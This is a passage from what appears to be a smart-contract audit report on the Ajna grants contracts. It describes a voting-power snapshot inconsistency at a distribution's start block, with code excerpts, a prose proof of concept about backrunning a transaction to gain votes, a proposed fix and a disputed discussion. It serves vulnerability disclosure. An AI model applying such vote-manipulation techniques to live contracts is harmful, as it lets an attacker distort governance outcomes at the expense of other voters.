class=\"mtk12\">votes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// cast each successive vote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">votes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_screeningVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">, </span><span class=\"mtk12\">votes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>When the <code>StandardFunding.screeningVote</code> function calls the following <code>StandardFunding._screeningVote</code> function, <code>if (screeningVotesCast[distributionId][account_] + votes_ > _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower()</code> is executed in which the <code>StandardFunding._getVotesScreening</code> function below would use the current distribution period’s start block as the <code>voteStartBlock_</code> input for calling the <code>Funding._getVotesAtSnapshotBlocks</code> function. Since the <code>Funding._getVotesAtSnapshotBlocks</code> function executes <code>voteStartBlock_ = voteStartBlock_ != block.number ? voteStartBlock_ : block.number - 1</code>, <code>voteStartBlock_</code> would be 1 block prior to the current distribution period’s start block when <code>block.number</code> equals the current distribution period’s start block, and <code>voteStartBlock_</code> would be the current distribution period’s start block when <code>block.number</code> is bigger than the current distribution period’s start block. However, it is possible that the same voter has different available votes at 1 block prior to the current distribution period’s start block and at the current distribution period’s start block. This is unlike the <code>StandardFunding._getVotesFunding</code> function that would always return the same voting power for the same voter when calling the <code>StandardFunding.fundingVote</code> function during the funding phase. Since calling the <code>StandardFunding._getVotesScreening</code> function when <code>block.number</code> equals the current distribution period’s start block and when <code>block.number</code> is bigger than the current distribution period’s start block during the screening phase can return different available votes for the same voter, this voter would call the <code>StandardFunding.screeningVote</code> function at a chosen <code>block.number</code> that would provide the highest votes.</p>\n<p>This should not be allowed because <code>_getVotesScreening(distributionId, account_)</code> needs to return the same number of votes across all blocks during the screening phase to make <code>if (screeningVotesCast[distributionId][account_] + votes_ > _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower()</code> effective in the <code>StandardFunding._screeningVote</code> function. For example, a voter who has no available votes at 1 block prior to the current distribution period’s start block can mint many AJNA tokens at the current distribution period’s start block and call the <code>StandardFunding.screeningVote</code> function at <code>block.number</code> that is bigger than the current distribution period’s start block during the screening phase to use her or his available votes at current distribution period’s start block. For another example, a voter who has available votes at 1 block prior to the current distribution period’s start block can call the <code>StandardFunding.screeningVote</code> function when <code>block.number</code> equals the current distribution period’s start block and then sell all of her or his AJNA tokens at the same <code>block.number</code>. Such voters’ actions are unfair to other voters who maintain the same number of available votes at 1 block prior to the current distribution period’s start block and at the current distribution period’s start block for the screening stage voting.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L698-L753\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L698-L753</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_screeningVote</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votes_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proposal_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that the voter has enough voting power to cast the vote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">screeningVotesCast</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">account_</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">_getVotesScreening</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InsufficientVotingPower</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L872-L881\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L872-L881</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getVotesScreening</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_distributions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate voting weight based on the number of tokens held at the snapshot blocks of the screening stage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getVotesAtSnapshotBlocks</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">VOTING_POWER_SNAPSHOT_DELAY</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">startBlock</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Please note that calling the following <code>ExtraordinaryFunding.voteExtraordinary</code> function when <code>block.number</code> equals <code>_extraordinaryFundingProposals[proposalId_].startBlock</code> also does not revert, and the <code>ExtraordinaryFunding._getVotesExtraordinary</code> function below also uses <code>_extraordinaryFundingProposals[proposalId_].startBlock</code> as the <code>voteStartBlock_</code> input for calling the <code>Funding._getVotesAtSnapshotBlocks</code> function. Hence, the same issue also applies to the <code>ExtraordinaryFunding.voteExtraordinary</code> function.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L131-L157\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L131-L157</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">voteExtraordinary</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// revert if msg.sender already voted on proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">hasVotedExtraordinary</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">]) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AlreadyVoted</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ExtraordinaryFundingProposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_extraordinaryFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// revert if proposal is inactive</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">executed</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ExtraordinaryFundingProposalInactive</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check voting power at snapshot block and update proposal votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getVotesExtraordinary</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">SafeCast</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUint120</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// record that voter has voted on this extraordinary funding proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hasVotedExtraordinary</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L246-L256\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L246-L256</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getVotesExtraordinary</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ExtraordinaryFundingProposalInactive</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_extraordinaryFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getVotesAtSnapshotBlocks</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">VOTING_POWER_SNAPSHOT_DELAY</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">startBlock</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following steps can occur for the described scenario.</p>\n<ol>\n<li>At 1 block prior to the current distribution period’s start block, Alice has no available votes at all.</li>\n<li>After noticing the <code>StandardFunding.startNewDistributionPeriod</code> transaction that would end the previous distribution period and starts the current distribution period in the mempool, Alice backruns that transaction by minting a lot of AJNA tokens at the current distribution period’s start block.</li>\n<li>When <code>block.number</code> becomes bigger than the current distribution period’s start block during the screening phase, Alice calls the <code>StandardFunding.screeningVote</code> function to successfully use all of her available votes at the current distribution period’s start block for a proposal.</li>\n<li>Alice’s actions are unfair to Bob who prepares for the screening stage voting and maintains the same number of available votes at 1 block prior to the current distribution period’s start block and at the current distribution period’s start block.</li>\n</ol>\n<h3 id=\"tools-used-9\" style=\"position:relative;\"><a href=\"#tools-used-9\" aria-label=\"tools used 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L578\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L578</a> can be updated to the following code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">_getScreeningStageEndBlock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidVote</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>and</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L139-L141\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L139-L141</a> can be updated to the following code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">executed</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ExtraordinaryFundingProposalInactive</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1555122516\">MikeHathaway (Ajna) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>Different voting mechanisms have different voting specifications.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1570303058\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@MikeHathaway - I think this issue is valid: it is not about different phases but about what happens at <code>voteStartBlock_ == block.number</code> versus <code>voteStartBlock_ == block.number + 1</code>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1571029497\">rbserver (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Sorry for any confusion. <code>At 1 block prior to the current distribution period's start block, Alice has no available votes at all</code> in the POC section means that Alice has no available votes at that particular block that is 1 block prior to the current distribution period’s start block; yet, she can still have available votes at blocks before that particular block. When Alice has available votes at the block that is 33 blocks prior to the current distribution period’s start block, it is possible that she uses all of her available votes at the current distribution period’s start block for the scenario described in the POC section.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1572754288\">MikeHathaway (Ajna) commented</a>:</strong></p>\n<blockquote>\n<p>If Alice has no voting power 1 block prior to start, than at the start block she will have no voting power if she doesn’t transfer and delegate tokens to that address. Prior voting power won’t matter, as we take the minimum of the prior snapshot and the current snapshot.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1572806509\">rbserver (warden) commented</a>:</strong></p>\n<blockquote>\n<p>If Alice mints or receives AJNA tokens at the current distribution period’s start block, can she gain available votes at the current distribution period’s start block? If so, she can have voting power at the current distribution period’s start block while has 0 available votes at 1 block prior to the current distribution period’s start block. Please correct me if I am understanding this incorrectly.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1572838173\">MikeHathaway (Ajna) commented</a>:</strong></p>\n<blockquote>\n<p>That is incorrect, the snapshot system requires that the balance be > 0 for the entire 33 blocks prior to the distribution period’s start. If any block is 0, their power is 0. </p>\n<p>This can be verified with a quick unit test:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testVotingPowerAtDistributionStart() external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // 14 tokenholders self delegate their tokens to enable voting on the proposals</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _selfDelegateVoters(_token, _votersArr);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // roll 32 blocks forward to the block before the distribution period starts</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.roll(_startBlock + 32);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // _tokenHolder1 transfers their tokens away</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address nonVotingAddress = makeAddr(&quot;nonVotingAddress&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        changePrank(_tokenHolder1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _token.transfer(nonVotingAddress, 25_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.roll(_startBlock + 33);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // nonVotingAddress returns the funds one block later</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        changePrank(nonVotingAddress);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _token.transfer(_tokenHolder1, 25_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span 